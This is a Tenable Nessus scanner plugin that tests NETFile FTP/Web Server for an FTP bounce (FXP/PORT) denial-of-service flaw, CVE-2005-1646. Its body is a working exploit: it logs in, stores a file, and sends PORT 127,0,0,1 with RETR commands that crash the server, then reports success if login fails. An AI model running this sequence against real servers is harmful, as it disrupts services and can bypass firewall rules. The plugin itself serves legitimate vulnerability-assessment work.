#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18295);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-1646");
  script_bugtraq_id(13653);
  script_xref(name:"OSVDB", value:"16621");

  script_name(english:"NETFile FTP/Web Server FTP Bounce Attack");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The NETFile FTP/Web server on the remote host is vulnerable to a
denial of service attack due to its support of the FXP protocol and
its failure to validate the IP address supplied in a PORT command. 

Additionally, this issue can be leveraged to bypass firewall rules
to connect to arbitrary hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.security.org.sg/vuln/netfileftp746port.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to NETFile FTP/Web Server 7.6.0 or later and
disable FXP support." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );


script_end_attributes();

  script_summary(english:"Checks for FXP DoS vulnerability in NETFile FTP/Web Server");
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/false_ftp");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner || "NETFile FTP" >!< banner ) exit(0);

# nb: we need to log in to exploit the vulnerability.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  exit(1, "ftp/login and/or ftp/password are empty");
}
writeable = get_kb_item("ftp/writeable_dir");
file = string(SCRIPT_NAME, "-", rand_str());


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  close(soc);
  exit(0, "couldn't login with supplied FTP credentials");
}


# Try to store an exploit on the remote.
c = string("CWD ", writeable);
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);

pasv = open_sock_tcp(
  ftp_pasv(socket:soc), 
  transport:get_port_transport(port)
);
c = string("STOR ", file);
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
if (s =~ "^(150|425) ") {
  # Here's the exploit.
  c = string(
    "USER ", user, "\r\n",
    "PASS ", pass, "\r\n",
    "CWD ", writeable, "\r\n",
    "PORT 127,0,0,1,0,", port, "\r\n",
    "RETR ", file, "\r\n"
  );
  send(socket:pasv, data:c);
  close(pasv);

  # If we stored it ok, try to retrieve it.
  s = recv_line(socket:soc, length:1024);
  if (s =~ "^226 ") {
    c = string("PORT 127,0,0,1,0,21");
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);

    c = string("RETR ", file);
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);

    # There's a problem if we can no longer log in.
    soc2 = open_sock_tcp(port);
    if (soc2) {
      if (!ftp_authenticate(socket:soc2, user:user, pass:pass)) {
        report = string(
          "Nessus has successfully exploited this vulnerability by adding a\n",
          "file - '", writeable, "/", file, "' - under NETFile's folder path\n",
          "on the remote host; you may wish to remove it at your convenience.\n"
        );
        security_warning(port:port, extra:report);
      }
      close(soc2);
    }
  }
}
ftp_close(socket:soc);
